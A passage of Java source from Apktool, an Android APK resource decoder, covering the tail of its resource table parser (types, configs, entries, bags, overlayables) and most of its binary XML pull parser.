            typeSpec = mPackage.getTypeSpec(id);
        } catch (UndefinedResObjectException ignored) {
            typeSpec = mPackage.addTypeSpec(id, mTypeStringPool.getString(id - 1));
        }

        String typeName = typeSpec.getName();
        ResType type;
        if (mInvalidConfigs.contains(config)) {
            if (mKeepBrokenResources) {
                Log.w(TAG, "Invalid resource config detected: %s %s", typeName, config);
                type = mPackage.addType(id, config);
            } else {
                Log.w(TAG, "Invalid resource config detected. Dropping resources: %s %s", typeName, config);
                type = null;
            }
        } else {
            type = mPackage.addType(id, config);
        }

        boolean isOffset16 = (flags & TYPE_FLAG_OFFSET16) != 0;
        boolean isSparse = (flags & TYPE_FLAG_SPARSE) != 0;

        if (isSparse) {
            mSparseEntries = true;
        }

        // #3778 - In some apps the res entries are unordered and might have to jump backwards.
        // We simply pre-sort them by offset.
        Map<Integer, List<Integer>> entryOffsets = new TreeMap<>();
        for (int i = 0; i < entryCount; i++) {
            int index, offset;

            // #3372 - 16-bit offsets should be stored as real offsets (* 4u).
            if (isSparse) {
                index = mIn.readUnsignedShort();
                offset = mIn.readUnsignedShort() * 4;
            } else {
                index = i;

                if (isOffset16) {
                    offset = mIn.readUnsignedShort();
                    offset = offset == NO_ENTRY_OFFSET16 ? NO_ENTRY : offset * 4;
                } else {
                    offset = mIn.readInt();
                }
            }

            List<Integer> indexes = entryOffsets.get(offset);
            if (indexes == null) {
                indexes = new ArrayList<>();
                entryOffsets.put(offset, indexes);
            }
            indexes.add(index);
        }

        // Exclude NO_ENTRY indexes.
        List<Integer> indexes = entryOffsets.get(NO_ENTRY);
        if (indexes != null) {
            if (type != null) {
                for (int index : indexes) {
                    if (!mPackage.hasEntrySpec(id, index)) {
                        mMissingEntrySpecs.add(ResId.of(mPackage.getId(), id, index));
                    }
                }
            }

            entryOffsets.remove(NO_ENTRY);
            // Update the entry count for logging.
            entryCount -= indexes.size();
        }

        // Parse the remaining entries.
        for (Map.Entry<Integer, List<Integer>> entryOffset : entryOffsets.entrySet()) {
            int offset = entryOffset.getKey();
            indexes = entryOffset.getValue();

            // #3428 - In some apps the res entries are padded for alignment, but in #3778 it made sense to align
            // to the start of the entries to handle all cases.
            long entryStart = parser.chunkStart() + entriesStart + offset;

            // As seen in some recent APKs - there are more entries reported than can fit in the chunk.
            if (entryStart >= parser.chunkEnd()) {
                Log.w(TAG, "End of chunk hit. Skipping remaining %s entries in type: %s", entryCount, typeName);
                break;
            }

            // Align the stream with the start of the entry.
            mIn.jumpTo(entryStart);

            Pair<Integer, ResValue> entry = parseEntry(typeName);
            int key = entry.getLeft();
            ResValue value = entry.getRight();

            // Add all entries with the parsed value, or discard them if the config was invalid.
            if (type != null) {
                for (int index : indexes) {
                    ResId resId = ResId.of(mPackage.getId(), id, index);

                    // #2824 - In some apps the res entries are duplicated with the 2nd being malformed.
                    // AOSP skips this, so we will do the same.
                    if (value == null) {
                        if (!mPackage.hasEntrySpec(id, index)) {
                            mMissingEntrySpecs.add(resId);
                        }
                        continue;
                    }

                    // The same entry can never be added more than once.
                    if (mPackage.hasEntry(id, index, config)) {
                        Log.w(TAG, "Ignoring repeated entry: id=%s, config=%s", resId, config);
                        continue;
                    }

                    if (!mPackage.hasEntrySpec(id, index)) {
                        mPackage.addEntrySpec(id, index, mKeyStringPool.getString(key));
                        mMissingEntrySpecs.remove(resId);
                    }
                    mPackage.addEntry(id, index, config, value);
                }
            }

            // Update the entry count for logging.
            entryCount -= indexes.size();
        }
    }

    private ResConfig parseConfig() throws AndrolibException, IOException {
        long startPosition = mIn.position();
        // ResTable_config
        int size = mIn.readInt();
        if (size < 8) {
            throw new AndrolibException("Config size < 8");
        }

        int mcc = mIn.readUnsignedShort();
        int mnc = mIn.readUnsignedShort();

        String language = "";
        String region = "";
        if (size >= 12) {
            language = unpackLanguageOrRegion(mIn.readBytes(2), 'a');
            region = unpackLanguageOrRegion(mIn.readBytes(2), '0');
        }

        int orientation = 0;
        int touchscreen = 0;
        if (size >= 14) {
            orientation = mIn.readUnsignedByte();
            touchscreen = mIn.readUnsignedByte();
        }

        int density = 0;
        if (size >= 16) {
            density = mIn.readUnsignedShort();
        }

        int keyboard = 0;
        int navigation = 0;
        int inputFlags = 0;
        int grammaticalInflection = 0;
        if (size >= 20) {
            keyboard = mIn.readUnsignedByte();
            navigation = mIn.readUnsignedByte();
            inputFlags = mIn.readUnsignedByte();
            grammaticalInflection = mIn.readUnsignedByte();
        }

        int screenWidth = 0;
        int screenHeight = 0;
        int sdkVersion = 0;
        int minorVersion = 0;
        if (size >= 28) {
            screenWidth = mIn.readUnsignedShort();
            screenHeight = mIn.readUnsignedShort();
            sdkVersion = mIn.readUnsignedShort();
            minorVersion = mIn.readUnsignedShort();
        }

        int screenLayout = 0;
        int uiMode = 0;
        int smallestScreenWidthDp = 0;
        if (size >= 32) {
            screenLayout = mIn.readUnsignedByte();
            uiMode = mIn.readUnsignedByte();
            smallestScreenWidthDp = mIn.readUnsignedShort();
        }

        int screenWidthDp = 0;
        int screenHeightDp = 0;
        if (size >= 36) {
            screenWidthDp = mIn.readUnsignedShort();
            screenHeightDp = mIn.readUnsignedShort();
        }

        String localeScript = "";
        String localeVariant = "";
        if (size >= 48) {
            localeScript = mIn.readAscii(4);
            localeVariant = mIn.readAscii(8);
        }

        int screenLayout2 = 0;
        int colorMode = 0;
        if (size >= 52) {
            screenLayout2 = mIn.readUnsignedByte();
            colorMode = mIn.readUnsignedByte();
            mIn.skipShort(); // screenConfigPad2
        }

        // Data beyond this point is non-standard.
        int bytesRead = (int) (mIn.position() - startPosition);
        byte[] unknown = readExceedingBytes("Config", size, bytesRead);

        ResConfig config = new ResConfig(
            mcc, mnc, language, region, orientation, touchscreen, density,
            keyboard, navigation, inputFlags, grammaticalInflection, screenWidth,
            screenHeight, sdkVersion, minorVersion, screenLayout, uiMode,
            smallestScreenWidthDp, screenWidthDp, screenHeightDp, localeScript,
            localeVariant, screenLayout2, colorMode, unknown);

        if (config.isInvalid()) {
            mInvalidConfigs.add(config);
        }

        return config;
    }

    private String unpackLanguageOrRegion(byte[] in, char base) {
        assert in.length == 2;
        // Return empty for "any" locale.
        if (in[0] == 0) {
            return "";
        }

        // If high bit is set then we have a packed 3-letter code.
        if ((in[0] & 0x80) != 0) {
            in = new byte[] {
                (byte) (base + (in[1] & 0x1F)),
                (byte) (base + ((in[1] & 0xE0) >>> 5) + ((in[0] & 0x03) << 3)),
                (byte) (base + ((in[0] & 0x7C) >>> 2))
            };
        }

        return new String(in, StandardCharsets.US_ASCII);
    }

    private Pair<Integer, ResValue> parseEntry(String typeName) throws AndrolibException, IOException {
        // ResTable_entry
        int size = mIn.readUnsignedShort();
        int flags = mIn.readUnsignedShort();
        int key = mIn.readInt();

        boolean isComplex = (flags & ENTRY_FLAG_COMPLEX) != 0;
        boolean isCompact = (flags & ENTRY_FLAG_COMPACT) != 0;

        if (key == NO_ENTRY && !isCompact) {
            return null;
        }

        if (isCompact) {
            mCompactEntries = true;
        }

        ResValue value;
        if (isComplex && !isCompact) {
            value = parseBag(typeName);
        } else if (isCompact) {
            // In a compactly packed entry, the key index is the size & type is higher 8 bits on flags.
            // We assume a size of 8 bytes for compact entries and the key index is the data itself encoded.
            int type = (flags >>> 8) & 0xFF;
            value = parseItem(typeName, false, type, key);

            // If compact then the size has the key index encoded.
            key = size;
        } else {
            value = parseItem(typeName, false);
        }

        return Pair.of(key, value);
    }

    private ResValue parseBag(String typeName) throws AndrolibException, IOException {
        // ResTable_map_entry
        int parentId = mIn.readInt();
        int count = mIn.readInt();

        // Some apps store ID resource values generated for enum/flag items in attribute resources as empty maps.
        // Replace with a placeholder value.
        if (typeName.equals("id")) {
            return ResCustom.ID;
        }

        ResReference parent = new ResReference(mPackage, ResId.of(parentId));
        ResBag.RawItem[] rawItems = new ResBag.RawItem[count];
        int rawItemsCount = 0;

        for (int i = 0; i < count; i++) {
            // ResTable_map
            int name = mIn.readInt();
            ResItem value = (ResItem) parseItem(typeName, true);

            // #2824 - In some apps the res entries are duplicated with the 2nd being malformed.
            // AOSP skips this, so we will do the same.
            if (value == null) {
                continue;
            }

            rawItems[rawItemsCount++] = new ResBag.RawItem(name, value);
        }

        if (rawItemsCount < rawItems.length) {
            rawItems = Arrays.copyOf(rawItems, rawItemsCount);
        }

        return ResBag.parse(typeName, parent, rawItems);
    }

    private ResValue parseItem(String typeName, boolean inBag) throws AndrolibException, IOException {
        // Res_value
        int size = mIn.readUnsignedShort();
        if (size < 8) {
            return null;
        }
        mIn.skipByte(); // res0
        int type = mIn.readUnsignedByte();
        int data = mIn.readInt();

        return parseItem(typeName, inBag, type, data);
    }

    private ResValue parseItem(String typeName, boolean inBag, int type, int data) throws AndrolibException {
        // ID resource values are either encoded as a boolean (false) or a resource reference.
        // A boolean (false) is no longer allowed in XML, replace with a placeholder value.
        // A resource reference is handled normally, unless it's @null.
        if (typeName.equals("id") && (data == 0 || (type != ResValue.TYPE_REFERENCE
                && type != ResValue.TYPE_DYNAMIC_REFERENCE))) {
            return ResCustom.ID;
        }

        // Special handling for strings and file references.
        if (type == ResValue.TYPE_STRING) {
            if (mValueStringPool == null) {
                throw new AndrolibException("Missing value string pool.");
            }

            CharSequence strValue = mValueStringPool.getText(data);

            // If a string is not allowed here, assume it's a file reference.
            // ResFileDecoder will replace it if it's an invalid file reference.
            if (strValue instanceof String && strValue.length() > 0 && !inBag && !typeName.equals("string")) {
                return new ResFileReference((String) strValue);
            }

            return new ResString(strValue);
        }

        return ResItem.parse(mPackage, type, data);
    }

    private void parseLibrary(ResChunkPullParser parser) throws IOException {
        // ResTable_lib_header
        int count = mIn.readInt();

        skipUnreadHeader(parser);

        for (int i = 0; i < count; i++) {
            // ResTable_lib_entry
            int packageId = mIn.readInt();
            String packageName = mIn.readUtf16(128);

            if (packageId != 0 && !packageName.isEmpty()) {
                mTable.addDynamicRefPackage(packageId, packageName);
            }
        }
    }

    private void parseOverlayable(ResChunkPullParser parser) throws AndrolibException, IOException {
        // ResTable_overlayable_header
        String name = mIn.readUtf16(256);
        String actor = mIn.readUtf16(256);

        skipUnreadHeader(parser);

        // An overlayable without a name is invalid, so we skip it entirely.
        if (name.isEmpty()) {
            return;
        }

        // Avoid conflicts by reusing overlayables.
        ResOverlayable overlayable;
        try {
            overlayable = mPackage.getOverlayable(name);
        } catch (UndefinedResObjectException ignored) {
            overlayable = mPackage.addOverlayable(name, actor);
        }

        parser = new ResChunkPullParser(mIn, parser.dataSize());
        while (nextChunk(parser)) {
            if (parser.chunkType() != ResChunkHeader.RES_TABLE_OVERLAYABLE_POLICY_TYPE) {
                skipUnexpectedChunk(parser);
                continue;
            }

            // ResTable_overlayable_policy_header
            int flags = mIn.readInt();
            int entryCount = mIn.readInt();

            skipUnreadHeader(parser);

            ResId[] entries = new ResId[entryCount];
            int entriesCount = 0;

            for (int i = 0; i < entryCount; i++) {
                entries[entriesCount++] = ResId.of(mIn.readInt());
            }

            if (entriesCount < entries.length) {
                entries = Arrays.copyOf(entries, entriesCount);
            }

            overlayable.addPolicy(flags, entries);
        }
    }

    private void parseStagedAliases(ResChunkPullParser parser) throws AndrolibException, IOException {
        // ResTable_staged_alias_header
        int count = mIn.readInt();

        skipUnreadHeader(parser);

        for (int i = 0; i < count; i++) {
            // ResTable_staged_alias_entry
            int stagedResId = mIn.readInt();
            int finalizedResId = mIn.readInt();

            if (stagedResId != 0 && finalizedResId != 0) {
                mPackage.addAlias(ResId.of(stagedResId), ResId.of(finalizedResId));
            }
        }
    }

    private void skipUnexpectedChunk(ResChunkPullParser parser) throws IOException {
        Log.w(TAG, "Skipping unexpected %s chunk of %s bytes at 0x%08x.",
            parser.chunkName(), parser.chunkSize(), parser.chunkStart());
        parser.skipChunk();
    }

    private void skipUnreadHeader(ResChunkPullParser parser) throws IOException {
        // Some apps lie about the reported size of their chunk header. Trusting the header size is misleading,
        // so compare to what we actually read in the header vs reported and skip the rest.
        int bytesRead = (int) (mIn.position() - parser.chunkStart());
        readExceedingBytes("Chunk header", parser.headerSize(), bytesRead);
    }

    private byte[] readExceedingBytes(String name, int size, int bytesRead) throws IOException {
        int bytesExceeding = size - bytesRead;
        if (bytesExceeding > 0) {
            byte[] buf = mIn.readBytes(bytesExceeding);
            for (int i = 0; i < buf.length; i++) {
                if (buf[i] != 0) {
                    Log.w(TAG, "%s size: %s bytes, read: %s bytes. Exceeding bytes: %s",
                        name, size, bytesRead, BaseEncoding.base16().encode(buf));
                    return buf;
                }
            }
        }
        return null;
    }

    private void injectDummyEntrySpecs() throws AndrolibException {
        if (mAllowDummyEntrySpecs) {
            ResReference parent = new ResReference(mPackage, ResId.NULL);
            ResBag.RawItem[] rawItems = new ResBag.RawItem[0];

            for (ResId resId : mMissingEntrySpecs) {
                ResTypeSpec typeSpec = mPackage.getTypeSpec(resId.typeId());
                String typeName = typeSpec.getName();
                ResValue value;
                if (typeName.equals("id")) {
                    value = ResCustom.ID;
                } else if (typeName.equals("string")) {
                    value = ResString.EMPTY;
                } else if (typeSpec.isBagType()) {
                    value = ResBag.parse(typeName, parent, rawItems);
                } else {
                    value = ResPrimitive.NULL;
                }

                mPackage.addEntrySpec(resId.typeId(), resId.entryId(), ResEntrySpec.DUMMY_PREFIX + resId);
                mPackage.addEntry(resId.typeId(), resId.entryId(), value);
            }
        }

        mMissingEntrySpecs.clear();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/BinaryXmlResourceParser.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.UndefinedResObjectException;
import brut.androlib.res.data.ResChunkHeader;
import brut.androlib.res.data.ResStringPool;
import brut.androlib.res.table.*;
import brut.androlib.res.table.value.*;
import brut.androlib.res.xml.ResXmlUtils;
import brut.common.Log;
import brut.util.BinaryDataInputStream;
import com.google.common.io.BaseEncoding;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

import java.io.InputStream;
import java.io.IOException;
import java.io.Reader;

public class BinaryXmlResourceParser implements XmlPullParser {
    private static final String TAG = BinaryXmlResourceParser.class.getName();
    private static final String NOT_SUPPORTED = "Method is not supported.";

    private final ResTable mTable;
    private final boolean mIgnoreRawValues;
    private final boolean mSkipUnresolved;
    private final NamespaceStack mNamespaces;

    private BinaryDataInputStream mIn;
    private ResChunkPullParser mParser;
    private ResStringPool mStringPool;
    private ResId[] mResourceMap;
    private boolean mHasRawValues;
    private AndrolibException mFirstError;

    private int mEventType;
    private int mLineNumber;
    private int mNamespaceIndex;
    private int mNameIndex;
    private int mIdIndex;
    private int mClassIndex;
    private int mStyleIndex;
    private Attribute[] mAttributes;

    public BinaryXmlResourceParser(ResTable table, boolean ignoreRawValues, boolean skipUnresolved) {
        mTable = table;
        mIgnoreRawValues = ignoreRawValues;
        mSkipUnresolved = skipUnresolved;
        mNamespaces = new NamespaceStack();
        resetEventInfo();
    }

    public boolean hasRawValues() {
        return mHasRawValues;
    }

    public AndrolibException getFirstError() {
        return mFirstError;
    }

    // XmlPullParser

    @Override
    public void setFeature(String name, boolean state) throws XmlPullParserException {
        throw new XmlPullParserException(NOT_SUPPORTED);
    }

    @Override
    public boolean getFeature(String name) {
        return false;
    }

    @Override
    public void setProperty(String name, Object value) throws XmlPullParserException {
        throw new XmlPullParserException(NOT_SUPPORTED);
    }

    @Override
    public Object getProperty(String name) {
        return null;
    }

    @Override
    public void setInput(Reader in) throws XmlPullParserException {
        throw new XmlPullParserException(NOT_SUPPORTED);
    }

    @Override
    public void setInput(InputStream inputStream, String inputEncoding) throws XmlPullParserException {
        if (inputEncoding != null) {
            throw new XmlPullParserException(NOT_SUPPORTED);
        }

        reset();
        mIn = new BinaryDataInputStream(inputStream);
        mParser = new ResChunkPullParser(mIn);
        try {
            if (!nextChunk()) {
                throw new IOException("Input file is empty.");
            }
            if (mParser.chunkType() != ResChunkHeader.RES_XML_TYPE) {
                throw new IOException("Unexpected chunk: " + mParser.chunkName() + " (expected: RES_XML_TYPE)");
            }
        } catch (IOException ex) {
            mIn = null;
            mParser = null;
            throw new XmlPullParserException("Could not initialize parser.", this, ex);
        }

        mParser = new ResChunkPullParser(mIn, mParser.dataSize());
    }

    @Override
    public String getInputEncoding() {
        return null;
    }

    @Override
    public void defineEntityReplacementText(String entityName, String replacementText) throws XmlPullParserException {
        throw new XmlPullParserException(NOT_SUPPORTED);
    }

    @Override
    public int getNamespaceCount(int depth) {
        return mNamespaces.getCount(depth);
    }

    @Override
    public String getNamespacePrefix(int pos) {
        if (mStringPool == null) {
            return null;
        }
        int prefixIdx = mNamespaces.getPrefix(pos);
        return mStringPool.getString(prefixIdx);
    }

    @Override
    public String getNamespaceUri(int pos) {
        if (mStringPool == null) {
            return null;
        }
        int uriIdx = mNamespaces.getUri(pos);
        return mStringPool.getString(uriIdx);
    }

    @Override
    public String getNamespace(String prefix) {
        throw new RuntimeException(NOT_SUPPORTED);
    }

    @Override
    public int getDepth() {
        return mNamespaces.getDepth();
    }

    @Override
    public String getPositionDescription() {
        return "XML line #" + getLineNumber();
    }

    @Override
    public int getLineNumber() {
        return mLineNumber;
    }

    @Override
    public int getColumnNumber() {
        return -1;
    }

    @Override
    public boolean isWhitespace() throws XmlPullParserException {
        if (mEventType != TEXT) {
            throw new XmlPullParserException("Parser must be on TEXT to get text.", this, null);
        }
        String text = getText();
        if (text == null) {
            return true;
        }
        int len = text.length();
        for (int i = 0; i < len; i++) {
            if (!Character.isWhitespace(text.charAt(i))) {
                return false;
            }
        }
        return true;
    }

    @Override
    public String getText() {
        if (mStringPool == null || mEventType != TEXT) {
            return null;
        }
        return mStringPool.getString(mNameIndex);
    }

    @Override
    public char[] getTextCharacters(int[] holderForStartAndLength) {
        String text = getText();
        if (text == null) {
            return null;
        }
        int len = text.length();
        holderForStartAndLength[0] = 0;
        holderForStartAndLength[1] = len;
        char[] chars = new char[len];
        text.getChars(0, len, chars, 0);
        return chars;
    }

    @Override
    public String getNamespace() {
        if (mStringPool == null || (mEventType != START_TAG && mEventType != END_TAG)) {
            return null;
        }
        return mStringPool.getString(mNamespaceIndex);
    }

    @Override
    public String getName() {
        if (mStringPool == null || (mEventType != START_TAG && mEventType != END_TAG)) {
            return null;
        }
        return mStringPool.getString(mNameIndex);
    }

    @Override
    public String getPrefix() {
        if (mStringPool == null || (mEventType != START_TAG && mEventType != END_TAG)) {
            return null;
        }
        int prefixIdx = mNamespaces.findPrefix(mNamespaceIndex);
        return mStringPool.getString(prefixIdx);
    }

    @Override
    public boolean isEmptyElementTag() {
        return false;
    }

    @Override
    public int getAttributeCount() {
        if (mEventType != START_TAG) {
            return -1;
        }
        return mAttributes != null ? mAttributes.length : 0;
    }

    @Override
    public String getAttributeNamespace(int index) {
        Attribute attr = getAttribute(index);
        if (attr == null) {
            return NO_NAMESPACE;
        }

        ResId nameId = getAttributeNameResourceId(index);

        // #2972 - If the namespace index is -1, the attribute is not present, but if the attribute is from system we
        // can resolve it to the default namespace. This may prove to be too aggressive as we scope the entire system
        // namespace, but it's better than not resolving it at all.
        if (attr.ns < 0) {
            if (nameId.pkgId() == ResTable.APP_PACKAGE_ID) {
                return getNonDefaultNamespaceUri(index);
            }
            if (nameId.pkgId() == ResTable.SYS_PACKAGE_ID) {
                return ResXmlUtils.ANDROID_RES_NS;
            }
            return NO_NAMESPACE;
        }

        // Minifiers like removing the namespace, so we will fall back to default namespace unless the package ID of
        // the resource is private. We will grab the non-standard one.
        String uri = mStringPool != null ? mStringPool.getString(attr.ns) : null;
        if (uri != null && !uri.isEmpty()) {
            return uri;
        }
        if (nameId.pkgId() == ResTable.APP_PACKAGE_ID) {
            return getNonDefaultNamespaceUri(index);
        }
        return ResXmlUtils.ANDROID_RES_NS;
    }

    @Override
    public String getAttributeName(int index) {
        Attribute attr = getAttribute(index);
        if (attr == null || attr.name < 0) {
            return "";
        }

        ResId nameId = getAttributeNameResourceId(index);

        // Android prefers the resource table value over what the string pool has.
        // This can be seen quite often in obfuscated apps where values such as:
        // <item android:state_enabled="true" app:state_collapsed="false" app:state_collapsible="true">
        // Are improperly decoded when trusting the string pool.
        // Leveraging the resource table allows us to get the proper value.
        // <item android:state_enabled="true" app:d2="false" app:d3="true">
        if (nameId != ResId.NULL) {
            try {
                return mTable.resolve(nameId).getName();
            } catch (AndrolibException ignored) {
            }
        }

        // Couldn't decode from resource table, fall back to string pool.
        String name = mStringPool != null ? mStringPool.getString(attr.name) : null;
        if (name == null) {
            name = "";
        }

        // In certain optimized apps, some attributes's specs are removed despite being used.
        // Inject a generic spec for the attribute, otherwise we can't rebuild.
        if (nameId != ResId.NULL) {
            try {
                ResPackage pkg = mTable.getMainPackage();
                if (pkg == null) {
                    // If no main package, we load "android" package instead.
                    pkg = mTable.resolvePackageGroup(1).getBasePackage();
                }

                // #2836 - Skip item if the resource cannot be resolved.
                if (mSkipUnresolved || nameId.pkgId() != pkg.getId()) {
                    Log.w(TAG, "Unresolved attr reference: ns=%s, name=%s, id=%s",
                        getAttributePrefix(index), name, nameId);
                    return name;
                }

                if (name.isEmpty()) {
                    name = ResEntrySpec.DUMMY_PREFIX + nameId;
                }
                name = pkg.addEntrySpec(nameId.typeId(), nameId.entryId(), name).getName();
                pkg.addEntry(nameId.typeId(), nameId.entryId(), ResAttribute.DEFAULT);
            } catch (AndrolibException ex) {
                if (mFirstError == null) {
                    mFirstError = ex;
                }
                Log.w(TAG, "Could not add missing attr: ns=%s, name=%s, id=%s",
                    getAttributePrefix(index), name, nameId);
            }
        }

        return name;
    }

    @Override
    public String getAttributePrefix(int index) {
        if (mStringPool == null) {
            return "";
        }
        Attribute attr = getAttribute(index);
        if (attr == null || attr.ns < 0) {
            return "";
        }
        int prefixIdx = mNamespaces.findPrefix(attr.ns);
        String prefix = mStringPool.getString(prefixIdx);
        if (prefix == null) {
            return "";
        }
        return prefix;
    }

    @Override
    public String getAttributeType(int index) {
        return "CDATA";
    }

    @Override
    public boolean isAttributeDefault(int index) {
        return false;
    }

    @Override
    public String getAttributeValue(int index) {
        Attribute attr = getAttribute(index);
        if (attr == null) {
            return "";
        }

        // Use the raw value if preserved (rare for modern apps).
        if (mHasRawValues && !mIgnoreRawValues) {
            String rawValue = mStringPool != null ? mStringPool.getString(attr.rawValue) : null;
            if (rawValue != null) {
                return rawValue;
            }
        }

        // Try to decode the typed value from the resource table.
        ResItem value = null;
        String name = null;
        String decoded = null;
        try {
            ResPackage pkg = mTable.getMainPackage();
            if (pkg == null) {
                // If no main package, we load "android" package instead.
                pkg = mTable.resolvePackageGroup(1).getBasePackage();
            }

            if (attr.valueType == ResValue.TYPE_STRING) {
                CharSequence strValue = mStringPool != null ? mStringPool.getText(attr.valueData) : null;
                value = strValue != null ? new ResString(strValue) : null;
            } else {
                value = ResItem.parse(pkg, attr.valueType, attr.valueData);
            }

            if (value != null) {
                ResId nameId = getAttributeNameResourceId(index);
                if (nameId != ResId.NULL) {
                    // We need the attribute entry's value to format this value.
                    try {
                        ResEntry nameEntry = mTable.resolveEntry(nameId);
                        name = nameEntry.getName();
                        if (nameEntry.getValue() instanceof ResAttribute) {
                            ResAttribute nameValue = (ResAttribute) nameEntry.getValue();

                            // Add the value type to the attribute if needed.
                            boolean isExplicitType;
                            switch (attr.valueType) {
                                case ResValue.TYPE_NULL:
                                case ResValue.TYPE_REFERENCE:
                                case ResValue.TYPE_DYNAMIC_REFERENCE:
                                case ResValue.TYPE_ATTRIBUTE:
                                case ResValue.TYPE_DYNAMIC_ATTRIBUTE:
                                    isExplicitType = false;
                                    break;
                                default:
                                    isExplicitType = true;
                                    break;
                            }
                            if (isExplicitType && !nameValue.hasSymbolsForValue(value)) {
                                nameValue.addValueType(attr.valueType);
                            }

                            decoded = nameValue.formatAsAttributeValue(value);
                        } else {
                            Log.w(TAG, "Unexpected attribute name: " + nameEntry);
                        }
                    } catch (UndefinedResObjectException ignored) {
                    }
                } else {
                    // Format the value with the default attribute.
                    decoded = ResAttribute.DEFAULT.formatAsAttributeValue(value);
                }
            }
        } catch (AndrolibException ex) {
            if (mFirstError == null) {
                mFirstError = ex;
            }
        }

        if (decoded == null) {
            if (name == null) {
                name = mStringPool != null ? mStringPool.getString(attr.name) : null;
            }

            Log.w(TAG, "Could not decode attribute value: ns=%s, name=%s, type=0x%02x, value=0x%08x",
                getAttributePrefix(index), name, attr.valueType, attr.valueData);

            if (value != null) {
                // Format the value with the default attribute.
                try {
                    decoded = ResAttribute.DEFAULT.formatAsAttributeValue(value);
                } catch (AndrolibException ignored) {
                }
            }
            if (decoded == null) {
                decoded = "";
            }
        }

        return decoded;
    }

    @Override
    public String getAttributeValue(String namespace, String name) {
        if (mEventType != START_TAG) {
            throw new IndexOutOfBoundsException("Parser must be on START_TAG to get attributes.");
        }
        if (mAttributes == null || mStringPool == null || name == null) {
            return "";
        }
        int uriIdx = mStringPool.findString(namespace);
        int nameIdx = mStringPool.findString(name);
        for (int i = 0; i < mAttributes.length; i++) {
            Attribute attr = mAttributes[i];
            if (attr != null && uriIdx == attr.ns && nameIdx == attr.name) {
                return getAttributeValue(i);
            }
        }
        return "";
    }

    @Override
    public int getEventType() {
        return mEventType;
    }

    @Override
    public int next() throws XmlPullParserException, IOException {
        if (mIn == null) {
            throw new XmlPullParserException("Parser is not opened.", this, null);
        }
        try {
            return doNext();
        } catch (IOException ex) {
            reset();
            throw ex;
        }
    }

    @Override
    public int nextToken() throws XmlPullParserException, IOException {
        return next();
    }

    @Override
    public void require(int type, String namespace, String name) throws XmlPullParserException {
        if (type != mEventType || (namespace != null && !namespace.equals(getNamespace()))
                || (name != null && !name.equals(getName()))) {
            throw new XmlPullParserException(TYPES[type] + " is expected.", this, null);
        }
    }

    @Override
    public String nextText() throws XmlPullParserException, IOException {
        if (mEventType != START_TAG) {
            throw new XmlPullParserException("Parser must be on START_TAG to read next text.", this, null);
        }
        int eventType = next();
        if (eventType == END_TAG) {
            return "";
        }
        if (eventType != TEXT) {
            throw new XmlPullParserException("Parser must be on TEXT or END_TAG to read text.", this, null);
        }
        String result = getText();
        eventType = next();
        if (eventType != END_TAG) {
            throw new XmlPullParserException("Event TEXT must be immediately followed by END_TAG.", this, null);
        }
        return result;
    }

    @Override
    public int nextTag() throws XmlPullParserException, IOException {
        int eventType = next();
        if (eventType == TEXT && isWhitespace()) {
            eventType = next();
        }
        if (eventType != START_TAG && eventType != END_TAG) {
            throw new XmlPullParserException("Expected start or end tag.", this, null);
        }
        return eventType;
    }

    // Utility methods

    private String getNonDefaultNamespaceUri(int pos) {
        String prefix = getNamespacePrefix(pos);
        if (prefix == null) {
            // If we are here, there is some clever obfuscation going on.
            // Our reference points to the namespace are gone. We have the namespaces that can't be touched in the
            // opening tag, though no known way to correlate them at this time, so return the res-auto namespace.
            return ResXmlUtils.ANDROID_RES_NS_AUTO;
        }
        return getNamespaceUri(pos);
    }

    private Attribute getAttribute(int index) {
        if (mEventType != START_TAG) {
            throw new IndexOutOfBoundsException("Parser must be on START_TAG to get attributes.");
        }
        if (mAttributes == null || index < 0 || index >= mAttributes.length) {
            throw new IndexOutOfBoundsException(
                String.format("Attribute index out of range: index=%s, length=%s",
                    index, mAttributes != null ? mAttributes.length : 0));
        }
        return mAttributes[index];
    }

    private ResId getAttributeNameResourceId(int index) {
        if (mResourceMap == null) {
            return ResId.NULL;
        }
        Attribute attr = getAttribute(index);
        if (attr == null || attr.name < 0 || attr.name >= mResourceMap.length) {
            return ResId.NULL;
        }
        return mResourceMap[attr.name];
    }

    private void reset() {
        mIn = null;
        mParser = null;
        mStringPool = null;
        mResourceMap = null;
        resetEventInfo();
        mNamespaces.reset();
    }

    private void resetEventInfo() {
        mEventType = START_DOCUMENT;
        mLineNumber = -1;
        mNamespaceIndex = -1;
        mNameIndex = -1;
        mIdIndex = -1;
        mClassIndex = -1;
        mStyleIndex = -1;
        mAttributes = null;
    }

    private boolean nextChunk() throws IOException {
        // Skip padding or unknown data at the end of current chunk.
        if (mParser.isChunk()) {
            int skipped = mParser.skipChunk();
            if (skipped > 0) {
                Log.d(TAG, "Skipped unknown %s bytes at end of %s chunk.", skipped, mParser.chunkName());
            }
        }

        // Reset previous event data.
        int lastEventType = mEventType;
        if (lastEventType != -1) {
            resetEventInfo();
        }

        // Stop if all root-level namespaces were popped.
        if (lastEventType == END_TAG && mNamespaces.getDepth() == 0
                && mNamespaces.getCurrentCount() == 0) {
            return false;
        }

        // Parse next chunk.
        while (mParser.next()) {
            // Skip unknown or unsupported chunks.
            if (mParser.chunkType() == ResChunkHeader.RES_NULL_TYPE) {
                Log.d(TAG, "Skipping unknown chunk (%s) of %s bytes at 0x%08x.",
                    mParser.chunkName(), mParser.chunkSize(), mParser.chunkStart());
                mParser.skipChunk();
                continue;
            }

            // Return this chunk.
            Log.d(TAG, "Chunk at 0x%08x: %s (%s bytes)",
                mParser.chunkStart(), mParser.chunkName(), mParser.chunkSize());
            return true;
        }

        // End of chunks.
        return false;
    }

    private int doNext() throws IOException {
        if (mEventType == END_DOCUMENT) {
            return END_DOCUMENT;
        }
        if (mEventType == END_TAG) {
